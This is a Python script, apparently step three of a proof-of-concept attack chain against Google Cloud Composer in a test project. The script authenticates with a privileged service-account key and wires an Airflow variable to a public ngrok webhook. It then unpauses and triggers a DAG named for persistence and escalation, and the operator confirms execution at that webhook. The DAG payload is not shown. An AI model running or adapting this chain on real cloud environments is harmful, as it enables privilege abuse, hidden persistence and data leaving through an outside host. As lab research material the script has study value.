# modules/abuse_composer_external_payload/3_trigger.py
import os
import sys
import time
import shlex
import subprocess
import requests

PROJECT_ID = "poc-tfm-tests"
REGION = "us-central1"
ENV_NAME = "tfm-composer-env"
DAG_NAME = "persistent_escalated_dag"   # <- el DAG que has desplegado

OWNER_SA  = "internal-support@poc-tfm-tests.iam.gserviceaccount.com"
OWNER_KEY = "internal-support-key.json"

def run_cmd(cmd, check=True, capture=False):
    print(f"[+] {cmd}")
    r = subprocess.run(
        cmd, shell=True, text=True,
        stdout=subprocess.PIPE if capture else None,
        stderr=subprocess.PIPE if capture else None
    )
    if check and r.returncode != 0:
        if capture and r.stderr:
            print(r.stderr.strip())
        print("[!] Error executing command.")
        sys.exit(1)
    return r

def composer_run(args, attempts=30, sleep=10, check=True, capture=False):
    """
    Ejecuta `gcloud composer environments run` con reintentos.
    `args` es una lista de tokens (p.ej. ["dags","trigger","--",DAG_NAME])
    """
    base = f"gcloud composer environments run {shlex.quote(ENV_NAME)} " \
           f"--location={shlex.quote(REGION)} --project={shlex.quote(PROJECT_ID)} "
    cmd  = base + " ".join(args)
    last = None
    for left in range(attempts, 0, -1):
        last = run_cmd(cmd, check=False, capture=capture)
        if last.returncode == 0:
            return last
        if left > 1:
            print(f"[i] Webserver not ready para: {' '.join(args[:2])}. "
                  f"Reintentando en {sleep}s… ({left-1} restantes)")
            time.sleep(sleep)
    if check:
        print("[!] Fallo persistente. Abortando.")
        sys.exit(1)
    return last

def authenticate_as_owner():
    print("[*] Autenticando como SA privilegiada …")
    run_cmd(
        f"gcloud auth activate-service-account {OWNER_SA} "
        f"--key-file={OWNER_KEY} --project={PROJECT_ID}"
    )
    print("[✓] Autenticado.")

def wait_env_running(timeout=600, poll=10):
    print("[*] Esperando a que el entorno esté RUNNING …")
    t0 = time.time()
    while time.time() - t0 < timeout:
        r = subprocess.run(
            ["gcloud","composer","environments","describe",ENV_NAME,
             "--location",REGION,"--project",PROJECT_ID,"--format=value(state)"],
            text=True, stdout=subprocess.PIPE
        )
        state = (r.stdout or "").strip() or "UNKNOWN"
        print(f"    state={state}", end="\r")
        if state == "RUNNING":
            print("\n[✓] Entorno RUNNING.")
            return True
        time.sleep(poll)
    print("\n[i] Sigo aunque no reporta RUNNING (puede ir justo).")
    return False

def wait_dag_visible(timeout=300, poll=6):
    print(f"[*] Esperando a que el DAG '{DAG_NAME}' aparezca en dags list …")
    t0 = time.time()
    while time.time() - t0 < timeout:
        r = composer_run(["dags","list","--"], attempts=1, sleep=0, check=False, capture=True)
        if r and r.returncode == 0 and DAG_NAME in (r.stdout or ""):
            print("[✓] DAG visible.")
            return True
        time.sleep(poll)
    print("[i] DAG no visible aún; continúo de todos modos.")
    return False

def refresh_webhook_from_ngrok():
    """Opcional: refresca WEBHOOK_URL si ngrok cambió la URL."""
    try:
        tunnels = requests.get("http://localhost:4040/api/tunnels", timeout=3).json().get("tunnels", [])
        https = [t["public_url"] for t in tunnels if t.get("proto") == "https"]
        if not https:
            print("[i] No hay túnel https de ngrok; omito.")
            return
        url = https[0]
        print(f"[*] Actualizando Airflow Variable WEBHOOK_URL -> {url}")
        # OJO: pasamos la URL ya citada para evitar problemas de shell
        composer_run(["variables","set","--","WEBHOOK_URL", shlex.quote(url)], attempts=15, sleep=6, check=True)
    except Exception as e:
        print(f"[i] No pude refrescar WEBHOOK_URL desde ngrok: {e}. Sigo…")

def unpause_and_trigger():
    print("[*] Unpausando DAG (idempotente)…")
    composer_run(["dags","unpause","--",DAG_NAME], attempts=10, sleep=6, check=False)

    print("[*] Lanzando trigger del DAG…")
    composer_run(["dags","trigger","--",DAG_NAME], attempts=30, sleep=10, check=True)
    print("[✓] Trigger enviado.")

def list_tasks():
    print("[*] Listando tareas (puede fallar si el webserver sigue calentando)…")
    composer_run(["tasks","list","--",DAG_NAME], attempts=6, sleep=5, check=False)

if __name__ == "__main__":
    authenticate_as_owner()
    wait_env_running()
    refresh_webhook_from_ngrok()   # <- opcional; quítalo si no usas webhook
    wait_dag_visible()
    unpause_and_trigger()
    list_tasks()
    print("[✓] Listo. Revisa tu webhook o Cloud Logging para confirmar la ejecución.")
